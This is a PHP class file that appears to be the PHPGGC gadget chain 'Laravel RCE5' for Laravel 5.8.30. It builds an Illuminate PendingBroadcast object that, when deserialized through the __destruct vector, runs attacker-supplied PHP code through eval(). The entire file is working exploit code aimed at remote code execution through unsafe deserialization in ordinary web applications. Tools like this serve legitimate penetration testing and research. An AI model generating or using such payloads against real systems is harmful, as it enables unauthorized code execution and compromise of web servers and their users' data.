<?php

namespace GadgetChain\Laravel;

class RCE5 extends \PHPGGC\GadgetChain\RCE
{
    public static $version = '5.8.30';
    public static $vector = '__destruct';
    public static $author = 'Phith0n';
    public static $informations = 'Executes given php code througn eval()';
    public static $parameters = [
    	'code'
    ];

    public function generate(array $parameters)
    {
        $code = '<?php ' . $parameters['code'] . ' exit; ?>';
        return new \Illuminate\Broadcasting\PendingBroadcast($code);
    }
}